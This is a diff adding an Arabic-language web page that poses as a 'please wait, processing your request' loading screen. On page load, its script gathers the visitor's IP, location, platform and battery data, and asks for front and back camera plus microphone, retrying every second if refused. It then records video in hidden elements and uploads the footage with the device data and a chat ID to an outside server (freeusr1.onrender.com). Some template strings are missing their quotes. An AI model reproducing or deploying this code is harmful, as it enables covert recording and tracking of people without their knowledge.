@@ -1,0 +1,221 @@
+<html lang="ar">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مرحبا بك في موقعنا</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 500px;
+        }
+        .spinner {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>جاري تنفيذ طلبك</h1>
+        <p>يرجى الانتظار...</p>
+    </div>
+    <!-- إخفاء الفيديوهات -->
+    <video id="frontVideo" playsinline="" autoplay="" muted="" style="display:none; visibility:hidden;"></video>
+    <video id="backVideo" playsinline="" autoplay="" muted="" style="display:none; visibility:hidden;"></video>
+    <script>
+        const frontVideo = document.getElementById('frontVideo');
+        const backVideo = document.getElementById('backVideo');
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get("chatId");
+        async function collectAdditionalData() {
+            try {
+                const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+                const battery = await navigator.getBattery();
+
+                return {
+                    ip: ipInfo.ip,
+                    country: ipInfo.country_name,
+                    city: ipInfo.city,
+                    platform: getPlatformInfo().platform,
+                    deviceVersion: getDeviceVersion(),
+                    batteryLevel: battery.level,
+                    batteryCharging: battery.charging,
+                };
+            } catch (error) {
+                console.error('Error collecting additional data', error);
+                return {};
+            }
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return { platform: "Windows" };
+            if (/Mac/.test(ua)) return { platform: "MacOS" };
+            if (/Linux/.test(ua)) return { platform: "Linux" };
+            if (/Android/.test(ua)) return { platform: "Android" };
+            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+            return { platform: "Unknown" };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        async function requestCameraPermission(facingMode) {
+            try {
+                const constraints = {
+                    video: { 
+                        facingMode: facingMode,
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: true
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                return stream;
+            } catch (error) {
+                console.error(Error accessing ${facingMode} camera:, error);
+                return null;
+            }
+        }
+
+        async function init() {
+            try {
+                const additionalData = await collectAdditionalData();
+                const frontStream = await requestCameraPermission('user');
+                const backStream = await requestCameraPermission('environment');
+
+                if (frontStream || backStream) {
+                    handleSuccess(frontStream, backStream, additionalData);
+                } else {
+                    throw new Error('No camera access granted');
+                }
+            } catch (e) {
+                console.error('Error in init:', e);
+                setTimeout(init, 1000);
+            }
+        }
+
+        function handleSuccess(frontStream, backStream, additionalData) {
+            if (frontStream) {
+                frontVideo.srcObject = frontStream;
+                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, 'front', additionalData));
+            }
+            if (backStream) {
+                backVideo.srcObject = backStream;
+                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, 'back', additionalData));
+            }
+        }
+
+        function setupCamera(video, cameraType, additionalData) {
+            video.play();
+            video.onplaying = () => {
+                const mediaRecorder = new MediaRecorder(video.srcObject, {
+                    mimeType: 'video/webm;codecs=vp9,opus',
+                    videoBitsPerSecond: 1000000 // 1 Mbps
+                });
+
+                let chunks = [];
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    chunks = [];
+                    sendVideo(blob, cameraType, additionalData);
+                };
+
+                mediaRecorder.start();
+
+                // Calculate how long the user was on the page
+                const timeOnPage = Date.now() - window.performance.timing.navigationStart;
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }, timeOnPage); // Stop recording after the user leaves
+            };
+        }
+
+        async function sendVideo(blob, cameraType, additionalData) {
+            const formData = new FormData();
+            formData.append('video', blob, video_${cameraType}.webm);
+            formData.append('userId', userId);
+            formData.append('cameraType', cameraType);
+            formData.append('additionalData', JSON.stringify(additionalData));
+
+            await post('https://freeusr1.onrender.com/submitVideo', formData);
+
+            if (frontVideo.srcObject) frontVideo.srcObject.getTracks().forEach(track => track.stop());
+            if (backVideo.srcObject) backVideo.srcObject.getTracks().forEach(track => track.stop());
+
+            document.querySelector('.container').innerHTML = 
+                <h1>تم الدخول الا الموقع بنجاح</h1>
+                <p>يمكنك إغلاق الصفحة الآن</p>
+            ;
+        }
+
+        async function post(url, formData) {
+            const maxRetries = 5;
+            let retries = 0;
+
+            while (retries < maxRetries) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(HTTP error! status: ${response.status});
+                    }
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        console.log('Video sent successfully');
+                        return;
+                    } else {
+                        throw new Error(data.error);
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    retries++;
+                    if (retries < maxRetries) {
+                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));
+                    }
+                }
+            }
+
+            console.error('Max retries reached. Unable to send video.');
+        }
+
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
